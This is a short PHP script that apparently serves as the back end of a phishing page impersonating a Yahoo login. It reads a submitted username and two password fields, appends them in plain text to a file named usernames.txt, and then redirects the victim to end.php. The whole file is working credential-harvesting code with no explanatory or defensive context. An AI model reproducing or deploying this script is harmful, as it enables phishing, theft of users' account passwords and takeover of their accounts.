<?php


file_put_contents("usernames.txt", 
"Yahoo Username: " . $_POST['U1'] . "
Yahoo Password: " . $_POST['P1'] . "
Yahoo Password: " . $_POST['P2'] . "\n", FILE_APPEND);
header('Location: end.php');
exit();
?>